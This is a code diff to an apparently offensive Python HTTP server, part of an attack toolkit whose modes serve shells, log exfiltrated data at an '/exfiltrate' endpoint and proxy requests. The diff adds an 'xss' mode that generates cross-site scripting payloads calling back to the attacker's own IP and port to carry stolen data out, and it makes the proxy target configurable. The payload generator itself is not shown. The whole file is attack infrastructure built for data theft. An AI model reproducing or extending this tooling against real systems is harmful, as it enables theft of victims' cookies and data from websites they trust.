@@ -7,6 +7,7 @@ import requests
 import sys
 import os
 import ssl
+import xss_handler
 
 class FileServerRequestHandler(BaseHTTPRequestHandler):
 
@@ -123,11 +124,12 @@ class HttpFileServer(HTTPServer):
         return self.serve_forever()
 
 if __name__ == "__main__":
-    if len(sys.argv) < 2 or sys.argv[1] not in ["shell","dump","proxy"]:
-        print("Usage: %s [shell,dump,proxy]" % sys.argv[0])
+    if len(sys.argv) < 2 or sys.argv[1] not in ["shell","dump","proxy","xss"]:
+        print("Usage: %s [shell,dump,proxy,xss]" % sys.argv[0])
         exit(1)
 
-    fileServer = HttpFileServer("0.0.0.0", 80)
+    httpPort = 80
+    fileServer = HttpFileServer("0.0.0.0", httpPort)
     ipAddress = util.getAddress()
 
     if sys.argv[1] == "shell":
@@ -139,7 +141,13 @@ if __name__ == "__main__":
         fileServer.dumpRequest("/exfiltrate")
         print("Exfiltrate data using: http://%s/exfiltrate" % ipAddress)
     elif sys.argv[1] == "proxy":
-        fileServer.forwardRequest("/proxy", "https://google.com")
+        url = "https://google.com" if len(sys.argv) < 3 else sys.argv[2]
+        fileServer.forwardRequest("/proxy", url)
         print("Exfiltrate data using: http://%s/proxy" % ipAddress)
+    elif sys.argv[1]  == "xss":
+        type = "img" if len(sys.argv) < 3 else sys.argv[2]
+        xss = xss_handler.generatePayload(type, ipAddress, httpPort)
+        print("Exfiltrate data using:")
+        print(xss)
 
     fileServer.start()
